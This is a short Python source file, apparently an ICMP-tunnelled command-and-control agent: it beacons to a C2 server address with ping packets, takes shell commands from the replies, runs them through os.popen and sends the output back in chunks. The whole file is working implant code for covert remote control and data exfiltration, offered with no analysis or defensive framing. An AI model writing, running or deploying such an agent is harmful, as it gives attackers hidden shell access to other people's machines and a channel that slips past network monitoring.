# client_agent.py
from scapy.all import *
import os
import time

C2_IP = "192.168.1.100"  # C2 server IP
AGENT_ID = os.urandom(2).hex()  # Unique-ish agent ID
SEQ = 0

def send_beacon():
    payload = f"{AGENT_ID}|BEACON|0|IDLE"
    reply = sr1(IP(dst=C2_IP)/ICMP(type=8)/payload, timeout=2, verbose=0)
    return reply

def send_result(seq, data):
    payload = f"{AGENT_ID}|RESULT|{seq}|{data}"
    sr1(IP(dst=C2_IP)/ICMP(type=8)/payload, timeout=2, verbose=0)

def start_agent():
    print(f"[*] Agent {AGENT_ID} started. Beaconing to {C2_IP}...")
    global SEQ
    while True:
        reply = send_beacon()
        if reply and reply.haslayer(Raw):
            fields = reply[Raw].load.decode(errors="ignore").split("|", 3)
            if len(fields) < 4:
                continue
            _, msg_type, _, data = fields
            if msg_type == "CMD" and data:
                print(f"[+] Received command: {data}")
                try:
                    result = os.popen(data).read().strip()
                except Exception as e:
                    result = f"ERROR: {e}"
                chunks = [result[i:i+512] for i in range(0, len(result), 512)]
                for i, chunk in enumerate(chunks):
                    send_result(SEQ + i, chunk)
                SEQ += len(chunks)
        time.sleep(5)

if __name__ == "__main__":
    start_agent()
